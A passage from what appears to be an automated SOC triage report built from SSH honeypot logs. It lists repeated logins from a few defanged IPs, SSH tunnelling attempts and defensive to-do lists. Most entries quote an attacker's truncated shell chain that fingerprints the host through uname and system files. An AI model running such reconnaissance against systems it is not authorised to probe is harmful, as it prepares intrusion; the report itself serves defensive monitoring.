| `2026-09-01 21:22:05` | `cowrie.command.input` |
| `2026-09-01 21:22:05` | `cowrie.command.input` |
| `2026-09-01 21:22:05` | `cowrie.command.input` |
| `2026-09-01 21:22:05` | `cowrie.command.input` |
| `2026-09-01 21:22:05` | `cowrie.command.input` |
| `2026-09-01 21:22:05` | `cowrie.command.success` |
| `2026-09-01 21:22:05` | `cowrie.command.input` |
| `2026-09-01 21:22:05` | `cowrie.command.input` |
| `2026-09-01 21:22:05` | `cowrie.command.input` |
| `2026-09-01 21:22:05` | `cowrie.command.input` |
| `2026-09-01 21:22:08` | `cowrie.log.closed` |
| `2026-09-01 21:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33ba77adc9ec

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:23 |
| **Last Seen** | 2026-09-01 21:23 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:23:15` | `cowrie.session.connect` |
| `2026-09-01 21:23:18` | `cowrie.client.version` |
| `2026-09-01 21:23:18` | `cowrie.client.kex` |
| `2026-09-01 21:23:30` | `cowrie.login.success` |
| `2026-09-01 21:23:35` | `cowrie.session.params` |
| `2026-09-01 21:23:35` | `cowrie.command.input` |
| `2026-09-01 21:23:35` | `cowrie.command.input` |
| `2026-09-01 21:23:35` | `cowrie.command.input` |
| `2026-09-01 21:23:35` | `cowrie.command.input` |
| `2026-09-01 21:23:35` | `cowrie.command.input` |
| `2026-09-01 21:23:35` | `cowrie.command.success` |
| `2026-09-01 21:23:35` | `cowrie.command.input` |
| `2026-09-01 21:23:35` | `cowrie.command.input` |
| `2026-09-01 21:23:35` | `cowrie.command.input` |
| `2026-09-01 21:23:35` | `cowrie.command.input` |
| `2026-09-01 21:23:39` | `cowrie.log.closed` |
| `2026-09-01 21:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee3f5f12c98f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 21:23 |
| **Last Seen** | 2026-09-01 21:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:23:57` | `cowrie.session.connect` |
| `2026-09-01 21:23:57` | `cowrie.client.version` |
| `2026-09-01 21:23:57` | `cowrie.client.kex` |
| `2026-09-01 21:23:58` | `cowrie.login.success` |
| `2026-09-01 21:23:58` | `cowrie.direct-tcpip.request` |
| `2026-09-01 21:23:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 21:23:58` | `cowrie.direct-tcpip.data` |
| `2026-09-01 21:23:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eb3ced0a13a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:25 |
| **Last Seen** | 2026-09-01 21:25 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:25:00` | `cowrie.session.connect` |
| `2026-09-01 21:25:02` | `cowrie.client.version` |
| `2026-09-01 21:25:02` | `cowrie.client.kex` |
| `2026-09-01 21:25:13` | `cowrie.login.success` |
| `2026-09-01 21:25:19` | `cowrie.session.params` |
| `2026-09-01 21:25:19` | `cowrie.command.input` |
| `2026-09-01 21:25:19` | `cowrie.command.input` |
| `2026-09-01 21:25:19` | `cowrie.command.input` |
| `2026-09-01 21:25:19` | `cowrie.command.input` |
| `2026-09-01 21:25:19` | `cowrie.command.input` |
| `2026-09-01 21:25:19` | `cowrie.command.success` |
| `2026-09-01 21:25:19` | `cowrie.command.input` |
| `2026-09-01 21:25:19` | `cowrie.command.input` |
| `2026-09-01 21:25:19` | `cowrie.command.input` |
| `2026-09-01 21:25:19` | `cowrie.command.input` |
| `2026-09-01 21:25:23` | `cowrie.log.closed` |
| `2026-09-01 21:25:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fddbf10cfd4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:26 |
| **Last Seen** | 2026-09-01 21:27 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:26:43` | `cowrie.session.connect` |
| `2026-09-01 21:26:45` | `cowrie.client.version` |
| `2026-09-01 21:26:45` | `cowrie.client.kex` |
| `2026-09-01 21:26:53` | `cowrie.login.success` |
| `2026-09-01 21:26:58` | `cowrie.session.params` |
| `2026-09-01 21:26:58` | `cowrie.command.input` |
| `2026-09-01 21:26:58` | `cowrie.command.input` |
| `2026-09-01 21:26:58` | `cowrie.command.input` |
| `2026-09-01 21:26:58` | `cowrie.command.input` |
| `2026-09-01 21:26:58` | `cowrie.command.input` |
| `2026-09-01 21:26:58` | `cowrie.command.success` |
| `2026-09-01 21:26:58` | `cowrie.command.input` |
| `2026-09-01 21:26:58` | `cowrie.command.input` |
| `2026-09-01 21:26:58` | `cowrie.command.input` |
| `2026-09-01 21:26:58` | `cowrie.command.input` |
| `2026-09-01 21:27:01` | `cowrie.log.closed` |
| `2026-09-01 21:27:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cd3a1468cac

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:28 |
| **Last Seen** | 2026-09-01 21:28 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:28:24` | `cowrie.session.connect` |
| `2026-09-01 21:28:26` | `cowrie.client.version` |
| `2026-09-01 21:28:26` | `cowrie.client.kex` |
| `2026-09-01 21:28:36` | `cowrie.login.success` |
| `2026-09-01 21:28:41` | `cowrie.session.params` |
| `2026-09-01 21:28:41` | `cowrie.command.input` |
| `2026-09-01 21:28:41` | `cowrie.command.input` |
| `2026-09-01 21:28:41` | `cowrie.command.input` |
| `2026-09-01 21:28:41` | `cowrie.command.input` |
| `2026-09-01 21:28:41` | `cowrie.command.input` |
| `2026-09-01 21:28:41` | `cowrie.command.success` |
| `2026-09-01 21:28:41` | `cowrie.command.input` |
| `2026-09-01 21:28:41` | `cowrie.command.input` |
| `2026-09-01 21:28:41` | `cowrie.command.input` |
| `2026-09-01 21:28:41` | `cowrie.command.input` |
| `2026-09-01 21:28:45` | `cowrie.log.closed` |
| `2026-09-01 21:28:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6164987d8515

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:29 |
| **Last Seen** | 2026-09-01 21:30 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:29:57` | `cowrie.session.connect` |
| `2026-09-01 21:30:00` | `cowrie.client.version` |
| `2026-09-01 21:30:00` | `cowrie.client.kex` |
| `2026-09-01 21:30:10` | `cowrie.login.success` |
| `2026-09-01 21:30:15` | `cowrie.session.params` |
| `2026-09-01 21:30:15` | `cowrie.command.input` |
| `2026-09-01 21:30:15` | `cowrie.command.input` |
| `2026-09-01 21:30:15` | `cowrie.command.input` |
| `2026-09-01 21:30:15` | `cowrie.command.input` |
| `2026-09-01 21:30:15` | `cowrie.command.input` |
| `2026-09-01 21:30:15` | `cowrie.command.success` |
| `2026-09-01 21:30:15` | `cowrie.command.input` |
| `2026-09-01 21:30:15` | `cowrie.command.input` |
| `2026-09-01 21:30:15` | `cowrie.command.input` |
| `2026-09-01 21:30:15` | `cowrie.command.input` |
| `2026-09-01 21:30:19` | `cowrie.log.closed` |
| `2026-09-01 21:30:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfb0b30bd84c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 21:31 |
| **Last Seen** | 2026-09-01 21:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:31:20` | `cowrie.session.connect` |
| `2026-09-01 21:31:20` | `cowrie.client.version` |
| `2026-09-01 21:31:20` | `cowrie.client.kex` |
| `2026-09-01 21:31:21` | `cowrie.login.success` |
| `2026-09-01 21:31:21` | `cowrie.direct-tcpip.request` |
| `2026-09-01 21:31:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 21:31:21` | `cowrie.direct-tcpip.data` |
| `2026-09-01 21:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ba39abea8d1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:33 |
| **Last Seen** | 2026-09-01 21:33 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:33:10` | `cowrie.session.connect` |
| `2026-09-01 21:33:12` | `cowrie.client.version` |
| `2026-09-01 21:33:12` | `cowrie.client.kex` |
| `2026-09-01 21:33:21` | `cowrie.login.success` |
| `2026-09-01 21:33:26` | `cowrie.session.params` |
| `2026-09-01 21:33:26` | `cowrie.command.input` |
| `2026-09-01 21:33:26` | `cowrie.command.input` |
| `2026-09-01 21:33:26` | `cowrie.command.input` |
| `2026-09-01 21:33:26` | `cowrie.command.input` |
| `2026-09-01 21:33:26` | `cowrie.command.input` |
| `2026-09-01 21:33:26` | `cowrie.command.success` |
| `2026-09-01 21:33:26` | `cowrie.command.input` |
| `2026-09-01 21:33:26` | `cowrie.command.input` |
| `2026-09-01 21:33:26` | `cowrie.command.input` |
| `2026-09-01 21:33:26` | `cowrie.command.input` |
| `2026-09-01 21:33:28` | `cowrie.log.closed` |
| `2026-09-01 21:33:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-844e3c294720

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 21:33 |
| **Last Seen** | 2026-09-01 21:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:33:34` | `cowrie.session.connect` |
| `2026-09-01 21:33:34` | `cowrie.client.version` |
| `2026-09-01 21:33:35` | `cowrie.client.kex` |
| `2026-09-01 21:33:35` | `cowrie.login.success` |
| `2026-09-01 21:33:36` | `cowrie.direct-tcpip.request` |
| `2026-09-01 21:33:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 21:33:36` | `cowrie.direct-tcpip.data` |
| `2026-09-01 21:33:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b94a8d8144c2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:34 |
| **Last Seen** | 2026-09-01 21:35 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:34:49` | `cowrie.session.connect` |
| `2026-09-01 21:34:51` | `cowrie.client.version` |
| `2026-09-01 21:34:51` | `cowrie.client.kex` |
| `2026-09-01 21:35:01` | `cowrie.login.success` |
| `2026-09-01 21:35:06` | `cowrie.session.params` |
| `2026-09-01 21:35:06` | `cowrie.command.input` |
| `2026-09-01 21:35:06` | `cowrie.command.input` |
| `2026-09-01 21:35:06` | `cowrie.command.input` |
| `2026-09-01 21:35:06` | `cowrie.command.input` |
| `2026-09-01 21:35:06` | `cowrie.command.input` |
| `2026-09-01 21:35:06` | `cowrie.command.success` |
| `2026-09-01 21:35:06` | `cowrie.command.input` |
| `2026-09-01 21:35:06` | `cowrie.command.input` |
| `2026-09-01 21:35:06` | `cowrie.command.input` |
| `2026-09-01 21:35:06` | `cowrie.command.input` |
| `2026-09-01 21:35:09` | `cowrie.log.closed` |
| `2026-09-01 21:35:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cbd0908dc96

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:36 |
| **Last Seen** | 2026-09-01 21:36 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:36:24` | `cowrie.session.connect` |
| `2026-09-01 21:36:26` | `cowrie.client.version` |
| `2026-09-01 21:36:26` | `cowrie.client.kex` |
| `2026-09-01 21:36:35` | `cowrie.login.success` |
| `2026-09-01 21:36:40` | `cowrie.session.params` |
| `2026-09-01 21:36:40` | `cowrie.command.input` |
| `2026-09-01 21:36:40` | `cowrie.command.input` |
| `2026-09-01 21:36:40` | `cowrie.command.input` |
| `2026-09-01 21:36:40` | `cowrie.command.input` |
| `2026-09-01 21:36:40` | `cowrie.command.input` |
| `2026-09-01 21:36:40` | `cowrie.command.success` |
| `2026-09-01 21:36:40` | `cowrie.command.input` |
| `2026-09-01 21:36:40` | `cowrie.command.input` |
| `2026-09-01 21:36:40` | `cowrie.command.input` |
| `2026-09-01 21:36:40` | `cowrie.command.input` |
| `2026-09-01 21:36:42` | `cowrie.log.closed` |
| `2026-09-01 21:36:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-243c27f232e7

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-01 21:37 |
| **Last Seen** | 2026-09-01 21:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:37:10` | `cowrie.session.connect` |
| `2026-09-01 21:37:10` | `cowrie.client.version` |
| `2026-09-01 21:37:10` | `cowrie.client.kex` |
| `2026-09-01 21:37:10` | `cowrie.login.success` |
| `2026-09-01 21:37:10` | `cowrie.direct-tcpip.request` |
| `2026-09-01 21:37:11` | `cowrie.direct-tcpip.data` |
| `2026-09-01 21:37:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b8033f87cfe

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:38 |
| **Last Seen** | 2026-09-01 21:38 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:38:00` | `cowrie.session.connect` |
| `2026-09-01 21:38:02` | `cowrie.client.version` |
| `2026-09-01 21:38:02` | `cowrie.client.kex` |
| `2026-09-01 21:38:10` | `cowrie.login.success` |
| `2026-09-01 21:38:17` | `cowrie.session.params` |
| `2026-09-01 21:38:17` | `cowrie.command.input` |
| `2026-09-01 21:38:17` | `cowrie.command.input` |
| `2026-09-01 21:38:17` | `cowrie.command.input` |
| `2026-09-01 21:38:17` | `cowrie.command.input` |
| `2026-09-01 21:38:17` | `cowrie.command.input` |
| `2026-09-01 21:38:17` | `cowrie.command.success` |
| `2026-09-01 21:38:17` | `cowrie.command.input` |
| `2026-09-01 21:38:17` | `cowrie.command.input` |
| `2026-09-01 21:38:17` | `cowrie.command.input` |
| `2026-09-01 21:38:17` | `cowrie.command.input` |
| `2026-09-01 21:38:20` | `cowrie.log.closed` |
| `2026-09-01 21:38:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0096f41f001c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-09-01 21:39 |
| **Last Seen** | 2026-09-01 21:39 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 21:39:33` | `cowrie.session.connect` |
| `2026-09-01 21:39:35` | `cowrie.client.version` |
| `2026-09-01 21:39:35` | `cowrie.client.kex` |
| `2026-09-01 21:39:43` | `cowrie.login.success` |
| `2026-09-01 21:39:48` | `cowrie.session.params` |
